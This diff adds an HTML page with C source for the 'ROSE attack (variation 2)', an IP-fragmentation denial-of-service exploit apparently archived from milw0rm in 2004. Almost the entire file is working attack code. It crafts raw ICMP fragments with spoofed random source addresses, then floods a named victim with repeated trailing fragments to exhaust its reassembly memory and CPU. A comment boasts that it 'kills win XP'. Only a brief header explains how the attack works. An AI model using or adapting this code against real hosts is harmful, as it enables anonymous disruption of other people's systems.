@@ -1,0 +1,222 @@
+<html><head><title>ROSE Attack (variation 2)</title></head><pre>/***
+    ROSE attack (variation 2) (chuck (at) lemure.net)
+    
+    Discovered by:
+    gandalf (at) digital.net
+    
+    code modified from large IGMP attack by:
+        Kox by Coolio (coolio (at) k-r4d.com)
+
+    Sends out small IP fragments totalling up to a large
+    ICMP packet.  Then repeatedly sends last IP Fragment forcing
+    reassembly code to traverse to last IP fragment in order to
+    do a free() followed by a malloc().  Or so it seems.
+
+    Reportedly works for TCP / UDP as well, since this is
+    a IP layer attack.
+
+
+***/
+
+/* just a thousand kills win XP */
+
+#define NUM_PACKETS 100
+
+
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;netdb.h&gt;
+#include &lt;string.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;pwd.h&gt;
+#include &lt;time.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;sys/utsname.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;netinet/ip.h&gt;
+#include &lt;netinet/ip_icmp.h&gt;
+
+#include &lt;netinet/ip_icmp.h&gt;
+
+void usage(char *arg)
+{
+        printf(&quot;Rose attack\n&quot;);
+        printf(&quot;Usage: %s &lt;victim&gt; [source]\n&quot;, arg);
+	printf(&quot;If source not specified, will send out from random ip's\n&quot;);
+        exit(1);
+}
+
+
+unsigned int randip()
+{
+        struct hostent *he;
+        struct sockaddr_in sin;
+        char *buf = (char *)calloc(1, sizeof(char) * 16);
+	
+        sprintf(buf, &quot;%d.%d.%d.%d&quot;,
+                (random()%191)+23,
+                (random()%253)+1,
+                (random()%253)+1,
+                (random()%253)+1); 
+	
+        return inet_addr(buf);
+        
+}
+
+unsigned short in_cksum(unsigned short *buh, int len)
+{
+        register long sum = 0;
+        unsigned short oddbyte;
+        register unsigned short answer;
+
+        while(len &gt; 1) {
+                sum += *buh++;
+                len -= 2;
+        }
+
+        if(len == 1) {
+                oddbyte = 0;
+                *((unsigned char *)&amp;oddbyte) = *(unsigned char *)buh;
+                sum += oddbyte;
+        }
+
+        sum = (sum &gt;&gt; 16) + (sum &amp; 0xFFFF);
+        sum += (sum &gt;&gt; 16);
+        answer = ~sum;
+        return answer;
+}
+
+int fire_away(struct sockaddr_in *victim, unsigned long src)
+{
+        int SMALLICMP = 1;
+        unsigned char *pkt;
+        struct iphdr *ip;
+        struct igmphdr *igmp;
+	struct icmphdr *icmp_pkt;
+        struct utsname *un;
+        struct passwd *p;
+	int idList[NUM_PACKETS];
+	unsigned long j;
+        int i, s;
+	int id = (random() % 40000) + 500;
+	for (i=0;i&lt;NUM_PACKETS;i++)
+	  idList[i]=(random() % 40000) + 500;
+
+        
+
+        pkt = (unsigned char *)calloc(1, SMALLICMP 
+				      + sizeof(struct iphdr) +
+				      sizeof(struct icmphdr));
+        ip = (struct iphdr *)pkt;
+ 	icmp_pkt = (struct icmphdr *)(pkt + sizeof(struct iphdr));
+        ip-&gt;version = 4;
+        ip-&gt;ihl = (sizeof *ip) / 4;
+        ip-&gt;ttl = 255;
+        ip-&gt;tot_len = htons(SMALLICMP);
+        ip-&gt;protocol = 1;
+        ip-&gt;id = htons(id);
+        ip-&gt;frag_off = htons(IP_MF);
+        ip-&gt;saddr = src;
+        ip-&gt;daddr = victim-&gt;sin_addr.s_addr;
+        ip-&gt;check = in_cksum((unsigned short *)ip, sizeof(struct iphdr));
+
+	
+	icmp_pkt-&gt;type = ICMP_ECHO;
+	icmp_pkt-&gt;code = 0;
+	icmp_pkt-&gt;checksum = 1000;
+	icmp_pkt-&gt;un.echo.id = random() % 255;
+	icmp_pkt-&gt;un.echo.sequence = random() % 255;
+	
+        for(i = sizeof(struct iphdr) + sizeof(struct icmphdr) + 1;
+            i &lt; SMALLICMP; i++){
+	  pkt[i] = random() % 255;
+	  
+	}
+	
+        if((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) &lt; 0) {
+                perror(&quot;error: socket()&quot;);
+                return 1;
+        }
+	
+	printf(&quot; Sending out series of small fragments\r\n&quot;);
+	
+	for(i=0;i&lt;NUM_PACKETS;i++){
+	  ip-&gt;id = htons(idList[i]);
+	  for (j=0; j&lt;8170; j += SMALLICMP + 1){	    
+	    ip-&gt;frag_off = htons(j | IP_MF);
+	    if(sendto(s, pkt,
+		      SMALLICMP + sizeof(struct iphdr), 
+		      0, (struct sockaddr *)victim,
+		      sizeof(struct sockaddr_in)) == -1) { 
+	      perror(&quot;error: sendto()&quot;);
+	      return 1;
+	    }
+	  }
+	}
+
+	printf(&quot; Sending out tailing fragments\r\n&quot;);
+	/* big frag at end... */
+	/* sending a large amount of the end fragments over and
+	   over.  This is definitely overkill, but seems to work */
+	for (j=0;j&lt;9999*NUM_PACKETS;j++){
+	  for(i=0;i&lt;NUM_PACKETS;i++){
+	    ip-&gt;id=htons(idList[i]);
+	    ip-&gt;frag_off = htons(8190|IP_MF);
+	    //ip-&gt;frag_off = htons(8100 | IP_MF);
+	    sendto(s, pkt, sizeof(struct iphdr) + SMALLICMP, 
+		   0, (struct sockaddr *)victim, 
+		   sizeof(struct sockaddr_in));
+	    /* if you do sleep, CPU usage goes way down.  But memory usage
+	       still creeps upward */
+	    //usleep(100); //sleep after every trailing packet
+	  }
+	  usleep(100); //sleep after every series of NUM_PACKETS
+	}
+        free(pkt);
+        close(s);
+        return 0;
+}
+
+int main(int argc, char *argv[])
+{
+        struct sockaddr_in victim;
+        struct hostent *he;
+	unsigned long source;
+        int i;
+
+        srandom(time(NULL));
+
+        if(argc &lt; 2)
+                usage(argv[0]);
+
+        if((he = gethostbyname(argv[1])) == NULL) {
+                herror(argv[1]);
+                exit(1);
+        }
+	
+	if (argc &gt; 2){
+	  source = inet_addr(argv[2]);
+	}
+	else {
+	  source = randip();
+	}
+	
+        memcpy(&amp;victim.sin_addr.s_addr, he-&gt;h_addr, he-&gt;h_length);
+        victim.sin_port = htons(0);
+        victim.sin_family = PF_INET;
+
+        printf(&quot;Sending ICMP fragments:  \r\n&quot;);
+        fflush(stdout);
+	fire_away(&amp;victim, source);
+	if (argc &lt; 3){
+	  source = randip();
+	}
+	
+	fflush(stdout);
+	printf(&quot;\nDONE\n&quot;);
+        fflush(stdout);
+}
+
+// milw0rm.com [2004-09-27]</pre></html>
